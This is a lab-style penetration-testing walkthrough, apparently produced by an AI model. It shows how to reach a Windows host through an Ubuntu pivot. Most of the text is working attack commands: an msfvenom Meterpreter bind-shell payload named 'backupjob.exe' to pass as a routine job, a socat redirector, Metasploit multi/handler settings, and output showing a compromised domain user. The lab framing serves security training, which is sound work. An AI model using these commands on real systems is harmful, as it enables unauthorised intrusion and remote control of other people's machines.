### Environment Overview

|   |   |   |
|---|---|---|
|Role|IP Address|Description|
|Attacker Machine|10.10.14.18|Runs Metasploit bind handler|
|Pivot Host|10.129.202.64|Ubuntu Server running socat|
|Target Machine|172.16.5.19|Windows host running bind shell payload|

|   |   |   |
|---|---|---|
|Variable|Value|Description|
|LPORT|8443|Port bind shell listens on (Windows target)|
|FORWARD TO|172.16.5.19:8443|Target for socat to forward to|
|SOCAT PORT|8080|Port socat listens on (Ubuntu/pivot host)|
|RHOST|10.129.202.64|IP of the socat host (pivot) Metasploit connects to|

---

## 1. Creating the Windows Payload

```Shell
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

Generates a bind shell payload that listens on the **Windows host** at port **8443**.

---

## 2. Starting Socat Bind Shell Redirector (Pivot Host)

```Shell
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

- Listens on the **Ubuntu pivot host** at port **8080**
- Forwards traffic to **172.16.5.19:8443** (Windows bind shell)

---

## 3. Configuring & Starting the Bind multi/handler (Attacker)

```Shell
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

- **RHOST = 10.129.202.64** (Ubuntu pivot running socat)
- **LPORT = 8080** (where socat is listening)
- This handler connects to socat, which relays to the Windows bind shell

---

## 4. Establishing Meterpreter Session

```Plain
meterpreter > getuid
Server username: INLANEFREIGHT\\victor
```

- Upon executing the payload on the **Windows target**,
- Metasploit connects through **Ubuntu’s socat listener**,
- Which forwards to the **bind shell on Windows**,
- Resulting in a successful Meterpreter session.

---

Let me know if you’d like this exported, or if you'd like the corresponding diagram described in the original prompt recreated visually.